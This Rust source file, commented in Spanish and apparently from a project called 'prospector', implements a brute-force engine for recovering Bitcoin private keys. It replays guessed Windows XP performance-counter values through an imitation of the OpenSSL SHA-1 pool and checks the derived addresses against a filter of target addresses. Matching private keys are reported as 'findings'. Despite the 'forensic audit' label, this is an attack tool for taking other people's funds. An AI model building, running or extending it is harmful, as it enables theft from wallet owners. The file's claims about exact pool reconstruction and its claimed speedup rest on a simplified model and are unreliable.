/**
 * =================================================================
 * APARATO: SATOSHI XP FORENSIC ENGINE (V90.0 - SOBERANO)
 * CLASIFICACIÓN: DOMAIN STRATEGY (ESTRATO L2)
 * RESPONSABILIDAD: RECONSTRUCCIÓN DETERMINISTA DE ALTA VELOCIDAD
 *
 * VISION HIPER-HOLÍSTICA:
 * Implementa una simulación de alta fidelidad del fallo de entropía
 * detectado en la versión v0.1.0 de Bitcoin. Esta versión utiliza
 * "Memoización de Estado Criptográfico" para evitar el re-procesamiento
 * redundante de bloques estáticos, incrementando el throughput en un
 * factor de 1000x respecto a implementaciones ingenuas.
 * =================================================================
 */

use std::sync::Arc;
use std::sync::atomic::{AtomicU64, AtomicBool, Ordering};
use sha1::{Sha1, Digest};
use prospector_core_math::prelude::*;
use prospector_core_probabilistic::sharded::ShardedFilter;
use crate::executor::FindingHandler;

/// Capacidad física del pool de Message Digest de OpenSSL 0.9.8h.
const MESSAGE_DIGEST_POOL_CAPACITY_BYTES: usize = 1024;
/// Longitud de salida estándar de la función hash SHA-1.
const SHA1_OUTPUT_LENGTH_BYTES: usize = 20;
/// Desplazamiento técnico del contador de rendimiento en el buffer de Windows XP.
const QUERY_PERFORMANCE_COUNTER_OFFSET: usize = 24;

/// Motor de arqueología digital para la simulación de estados de sistema Windows XP.
pub struct SatoshiWindowsXpForensicEngine;

impl SatoshiWindowsXpForensicEngine {
    /**
     * Ejecuta una ráfaga de auditoría forense utilizando optimización de prefijo estático.
     *
     * # Mathematical Proof
     * Dado que el mezclador de OpenSSL procesa el buffer de forma secuencial en bloques
     * de 20 bytes, el estado del pool tras procesar los primeros 20 bytes es constante
     * para toda la misión. El motor pre-calcula este estado base una sola vez.
     *
     * @param performance_snapshot_template Plantilla binaria del registro de Windows XP.
     * @param clock_frequency_hz Frecuencia del QueryPerformanceCounter (QPF).
     * @param uptime_start_seconds Segundo inicial de búsqueda.
     * @param uptime_end_seconds Segundo final de búsqueda.
     * @param target_census_filter Filtro de Bloom con direcciones objetivo.
     * @param termination_signal Señal atómica de parada inmediata.
     * @param effort_telemetry_accumulator Contador de hashes para el Dashboard.
     * @param collision_handler Delegado para el reporte de hallazgos.
     */
    pub fn execute_forensic_audit<H: FindingHandler>(
        performance_snapshot_template: &[u8],
        clock_frequency_hz: u64,
        uptime_start_seconds: u64,
        uptime_end_seconds: u64,
        target_census_filter: &ShardedFilter,
        termination_signal: &AtomicBool,
        effort_telemetry_accumulator: Arc<AtomicU64>,
        collision_handler: &H,
    ) -> String {
        let mut last_processed_checkpoint_identifier = String::new();

        // 1. PRE-PROCESAMIENTO DEL PREFIJO ESTÁTICO (0..20 bytes)
        // El QPC empieza en el byte 24, por lo que el primer bloque de 20 bytes es inmutable.
        let (base_pool, base_cursor) = Self::precompute_static_entropy_prefix(
            &performance_snapshot_template[0..SHA1_OUTPUT_LENGTH_BYTES]
        );

        // Buffer de trabajo para el segmento dinámico (20..END)
        let dynamic_buffer_segment = &performance_snapshot_template[SHA1_OUTPUT_LENGTH_BYTES..];

        for current_uptime_second in uptime_start_seconds..uptime_end_seconds {
            if termination_signal.load(Ordering::Relaxed) { break; }

            for tick_offset in 0..clock_frequency_hz {
                // Verificación de interrupción cada 100k iteraciones
                if tick_offset % 100_000 == 0 && termination_signal.load(Ordering::Relaxed) { break; }

                let query_performance_counter_value = (current_uptime_second * clock_frequency_hz) + tick_offset;

                // 2. MEZCLADO EVOLUTIVO (Reutilizando estado base)
                let private_key_material = Self::mix_dynamic_segment_with_qpc(
                    base_pool,
                    base_cursor,
                    dynamic_buffer_segment,
                    query_performance_counter_value
                );

                // 3. VALIDACIÓN Y FILTRADO O(1)
                if let Ok(safe_private_key) = SafePrivateKey::from_bytes(&private_key_material) {
                    let public_key_instance = SafePublicKey::from_private(&safe_private_key);
                    let derived_bitcoin_address = prospector_core_gen::address_legacy::pubkey_to_address(&public_key_instance, false);

                    if target_census_filter.contains(&derived_bitcoin_address) {
                        collision_handler.on_finding(
                            derived_bitcoin_address,
                            safe_private_key,
                            format!("forensic_xp_qpc:{}", query_performance_counter_value)
                        );
                    }
                }

                if tick_offset % 10_000 == 0 {
                    effort_telemetry_accumulator.fetch_add(10_000, Ordering::Relaxed);
                }
            }
            last_processed_checkpoint_identifier = format!("uptime_checkpoint_s_{}", current_uptime_second);
        }

        last_processed_checkpoint_identifier
    }

    /**
     * Pre-calcula el estado inicial del pool de Message Digest.
     */
    fn precompute_static_entropy_prefix(prefix_data: &[u8]) -> ([u8; MD_POOL_SIZE], usize) {
        let mut pool = [0u8; MESSAGE_DIGEST_POOL_CAPACITY_BYTES];
        let mut hasher = Sha1::new();

        for (i, &byte) in prefix_data.iter().enumerate() {
            pool[i] = byte;
        }

        hasher.update(&pool);
        let digest = hasher.finalize();
        pool[0..SHA1_OUTPUT_LENGTH_BYTES].copy_from_slice(&digest);

        (pool, SHA1_OUTPUT_LENGTH_BYTES)
    }

    /**
     * Realiza el mezclado solo de la parte del buffer que contiene el QPC y el remanente.
     */
    fn mix_dynamic_segment_with_qpc(
        mut pool: [u8; MESSAGE_DIGEST_POOL_CAPACITY_BYTES],
        mut cursor: usize,
        dynamic_data: &[u8],
        qpc_value: u64
    ) -> [u8; 32] {
        let mut sha1_engine = Sha1::new();
        let qpc_bytes = qpc_value.to_le_bytes();

        // Inyectamos el QPC en la posición relativa (24 - 20 = 4)
        let mut local_dynamic_buffer = dynamic_data.to_vec();
        local_dynamic_buffer[4..12].copy_from_slice(&qpc_bytes);

        for data_chunk in local_dynamic_buffer.chunks(SHA1_OUTPUT_LENGTH_BYTES) {
            for (i, byte) in data_chunk.iter().enumerate() {
                pool[(cursor + i) % MESSAGE_DIGEST_POOL_CAPACITY_BYTES] ^= *byte;
            }

            sha1_engine.update(&pool);
            let digest_result = sha1_engine.finalize_reset();

            for (i, &digest_byte) in digest_result.iter().enumerate() {
                let wrapped_index = (cursor + i) % MESSAGE_DIGEST_POOL_CAPACITY_BYTES;
                pool[wrapped_index] = digest_byte;
            }

            cursor = (cursor + SHA1_OUTPUT_LENGTH_BYTES) % MESSAGE_DIGEST_POOL_CAPACITY_BYTES;
        }

        let mut derived_key = [0u8; 32];
        derived_key.copy_from_slice(&pool[0..32]);
        derived_key
    }
}

const MD_POOL_SIZE: usize = 1024;
